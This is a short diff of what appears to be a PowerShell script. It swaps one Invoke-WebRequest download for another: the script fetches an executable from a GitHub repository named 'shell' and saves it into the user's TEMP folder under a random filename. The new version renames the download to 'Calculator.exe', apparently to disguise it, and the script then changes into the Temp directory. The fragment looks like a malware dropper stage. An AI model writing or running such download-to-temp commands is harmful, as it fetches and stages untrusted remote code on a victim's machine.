@@ -1,4 +1,4 @@
-iwr https://github.com/VBV11/shell/raw/main/nim.exe?dl=1 -O $env:TEMP\ASA4oweLqG1cf2859e-7ea8-4f08-afe6-27870ab67338.exe
+iwr https://github.com/VBV11/shell/raw/main/Calculator.exe?dl=1 -O $env:TEMP\ASA4oweLqG1cf2859e-7ea8-4f08-afe6-27870ab67338.exe
 
 cd AppData\Local\Temp 
 
